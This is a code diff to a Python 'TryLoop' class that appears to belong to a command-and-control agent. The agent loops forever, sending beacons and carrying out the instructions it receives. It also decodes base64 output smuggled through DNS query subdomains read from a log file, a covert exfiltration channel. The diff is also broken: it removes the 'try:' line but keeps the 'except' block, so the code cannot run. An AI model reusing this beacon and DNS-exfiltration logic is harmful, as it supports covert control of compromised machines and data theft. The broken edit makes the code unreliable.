@@ -46,13 +46,12 @@ class TryLoop:
         self.profile['platform'] = platform
         self.profile['pid'] = pid
         while True:
-            try:
-                self.profile['results'] = []
-                print('[*] Sending beacon for %s' % self.profile.get('paw', 'unknown'))
-                beacon = self._send_beacon()
-                instructions = self._next_instructions(beacon=beacon)
-                sleep = self._handle_instructions(instructions, sock)
-                time.sleep(sleep)
+            self.profile['results'] = []
+            print('[*] Sending beacon for %s' % self.profile.get('paw', 'unknown'))
+            beacon = self._send_beacon()
+            instructions = self._next_instructions(beacon=beacon)
+            sleep = self._handle_instructions(instructions, sock)
+            time.sleep(sleep)
             except Exception as e:
                 print('[-] Operation loop error %s' % e)
                 time.sleep(30)
@@ -116,14 +115,17 @@ class TryLoop:
 
     def _get_output(self):
         log = open(DNS_LOG_FILE, "r")
-        last_log = log.readlines()[-1]
+        last_log = (log.readlines()[-1]).split()
+        print(last_log)
+        log.close()
         url = last_log[5]
         parts = url.split('.')
-        if (parts[0] == "none"):
+        if (parts[0] == 'normal'):
             return ""
         output = ""
         for part in parts:
             output += part
+        print(output)
         output = b64decode(output).decode('utf-8', errors='ignore')
         return output
 
